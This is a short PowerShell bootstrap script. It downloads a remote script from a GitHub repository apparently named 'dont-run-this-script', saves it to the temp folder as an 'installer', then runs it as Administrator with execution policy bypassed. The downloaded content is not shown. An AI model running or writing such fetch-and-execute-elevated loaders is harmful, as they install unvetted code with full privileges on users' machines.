# bootstrap.ps1
$ErrorActionPreference = "Stop"

$Url = "https://raw.githubusercontent.com/fersonull/dont-run-this-script/main/ps.ps1"
$LocalPath = "$env:TEMP\ps.ps1"

Write-Host "Downloading installer..."
Invoke-WebRequest -UseBasicParsing $Url -OutFile $LocalPath

Write-Host "Launching installer as Administrator..."
Start-Process powershell.exe `
  -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$LocalPath`"" `
  -Verb RunAs
